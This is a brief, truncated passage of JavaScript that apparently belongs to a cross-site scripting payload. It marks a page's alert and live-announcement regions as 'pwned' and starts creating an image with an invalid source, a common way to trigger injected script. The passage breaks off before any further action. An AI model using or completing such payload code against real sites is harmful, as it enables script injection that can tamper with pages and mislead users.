            const sinks = document.querySelectorAll('[aria-live="assertive"], [role="alert"]');
            sinks.forEach(s => {
                if(!s.dataset.pwned) {
                    s.dataset.pwned = "true";
                    const i = document.createElement('img');
                    i.src = 'x';
